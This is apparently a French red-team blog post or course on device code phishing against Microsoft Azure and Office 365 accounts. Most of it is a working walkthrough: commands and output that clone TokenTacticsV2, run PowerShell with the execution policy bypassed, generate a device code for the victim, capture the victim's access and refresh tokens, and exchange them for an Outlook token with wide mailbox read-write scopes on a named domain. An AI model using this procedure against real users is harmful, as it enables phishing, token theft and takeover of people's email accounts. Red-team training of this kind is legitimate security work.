author = "Enzo"
title = "Azure - OSINT"
date = "2026-06-29"
categories = [
    "Red Team"
]
tags = [
    "Phishing",
    "Office",
    "Azure",
    "Cours"
]
# Phishing - Device Code
## C'est quoi ? 
L'attaque par ``Device Code Phishing``, est (comme son nom l'indique) une attaque de phishing. Elle à été découverte par ``@DRAzureAD`` (le créateur de ``AADInternals``). C'est une méthode très pertinante car elle est plus compliqué à détecter que le phishing OAuth classique, et surtout elle est plus simple à mettre en place.

Ceci dit, il y a un point "négatif" à cette technique, elle doit être exécuté très rapidement car le code d'appareil n'est valide que 15 minutes, ce qui limite la fenêtre d'action de l'attaquant.

L'attaque ce décompse en 3 étapes que nous vérrons dans cet article. 

## Exploitation

### Installation
[https://github.com/f-bader/TokenTacticsV2.git](https://github.com/f-bader/TokenTacticsV2.git)
````Powershell 
git clone https://github.com/f-bader/TokenTacticsV2.git
Cloning into 'TokenTacticsV2'...
remote: Enumerating objects: 370, done.
remote: Counting objects: 100% (177/177), done.
remote: Compressing objects: 100% (70/70), done.
remote: Total 370 (delta 115), reused 129 (delta 106), pack-reused 193 (from 1)
Receiving objects: 100% (370/370), 1.74 MiB | 6.70 MiB/s, done.
Resolving deltas: 100% (223/223), done.
````
Une fois installer nous pouvons passer à la créeation de device code. 

### Création du code
````Powershell 
powershell -ep bypass
Import-Module .\TokenTactics.psd1
Get-AzureToken -Client Graph
user_code        : LJN9VTLG2
device_code      : LBgABIQEAAAAdDD7nC9b5Q7JPd_okEQRFRXZvU3RzQXJ0aWZhY3RzAQAAAAAAdTu8sH5asvvue0PJMXZDvgtV-Fh83_mVDZepeX7
O_Off2_D92j96701zYIsN3LVZPhKpFE8y3-weT1U1lDX-OaCVrKaVCdXCWdEcV-V_3lUaWWHwOZBQSn1d6-92wHtthQ-u5IKqDDt
a0jSAZTGliXX8tDUIaYcdz4QWlhljnSEB3kER8-lTxGa7bPxCgIvuHHXHi_7QlVSF7Z6ss201lwgWWYZ2fSKKKQbA_Q0KbynALa7
JwddUtUYwBlHjFpH3p9qs1rmZKN9GUTB8IoFWE1BtL2iKkfVtw1ay8lk1BQTUKRf9oD8DlDLEW9-FZa_pSD1d17P1di045TVt6Y5
l0kgB_lhBO9AlN5X6qXgJKQvVYqKBpyGxcHv91RuQrQma9WuaUpjYY0IbDM_rzr1nZ_emAoVSX5wg9ZzjYNmKt8uFEleQxFlAlvp
XI8BJHk1vcQedAHbfGjLfEwZdmUhQOi7rtuu1K39-Q8wXvXuN9F4BqwRVzBA2ASKdyyxsC9HmMLUC9_EtMpWetn1PJPWT2th6-pF
CLfDlN0TnQIoGa-DrFAMME1V0-bqoVsA8TmzpSRi1n64_NiYbXdAWfe7xeIqdl5H42rqby_d_MdTEVEXo7ueVE6PHMAxeBjp9Bja
xFrG8L5tqe7OTiKWfoztkzMZqnQgPsET2gmp8QE2WlxpspnA1qOcBhIWhYaJ1NN4WxR3GiwR_NVza2AzSz6Y0g8VHmBvfkEJdqQo
p-ghJ-uIgAA
verification_uri : https://login.microsoft.com/device
expires_in       : 900
interval         : 5
message          : To sign in, use a web browser to open the page https://login.microsoft.com/device and enter the
                   code LJN9VTLG2 to authenticate.
○  Waiting for user to authenticate
○  Waiting for user to authenticate
○  Waiting for user to authenticate
○  Waiting for user to authenticate
○  Waiting for user to authenticate
○  Waiting for user to authenticate
○  Waiting for user to authenticate
○  Waiting for user to authenticate
````
Une fois le mail envoyé avec le code et le lien, l'utilisateur tombera sur cette page, une page web officielle de microsoft : 
![image Device Code](image.png)

Il faudra que l'utilisateur déclare le code donné précédemment dans notre terminal. 
En suite, dans notre terminal nous verrons ça : 
````Powershell
✓  Token acquired and saved as $response
````
Pour avoir les infos qui sont stocké dans `$response` il nous suffit de taper la commande suivante : 
````Powershell
$response

token_type     : Bearer
scope          : https://graph.windows.net/user_impersonation https://graph.windows.net/.default
expires_in     : 8063
ext_expires_in : 8063
access_token   : <access_token>
refresh_token  : <refresh_token>
foci           : 1
id_token       : <id_token>
````
(Refresh Token et Tiken ID partiellement supprimé). 

Une fois les tokens récupéré, il nous suffit de les mettres dans ``Burp Suite`` pour accèder de façon simple à la boîte mail de notre utilisateur. 

### Accès à la boîte mail

````
RefreshTo-OutlookToken -Domain csgv.com
✓  Token acquired and saved as $OutlookToken

token_type     : Bearer
scope          : https://outlook.office365.com/Branford-Internal.ReadWrite
                 https://outlook.office365.com/Calendars.ReadWrite
                 https://outlook.office365.com/Calendars.ReadWrite.Shared
                 https://outlook.office365.com/Contacts.ReadWrite
                 https://outlook.office365.com/Contacts.ReadWrite.Shared
                 https://outlook.office365.com/CoreItem-Internal.Write.All
                 https://outlook.office365.com/CoreItem-Internal.Write.Shared
                 https://outlook.office365.com/EAS.AccessAsUser.All
                 https://outlook.office365.com/EopPolicySync.AccessAsUser.All
                 https://outlook.office365.com/EopPsorWs.AccessAsUser.All
                 https://outlook.office365.com/EWS.AccessAsUser.All https://outlook.office365.com/Files.Read.Sdp
                 https://outlook.office365.com/Files.ReadWrite.All
                 https://outlook.office365.com/Files.ReadWrite.Shared
                 [...]
                 https://outlook.office365.com/user_impersonation
                 https://outlook.office365.com/User-Internal.ReadWrite https://outlook.office365.com/.default
expires_in     : 8427
ext_expires_in : 8427
````
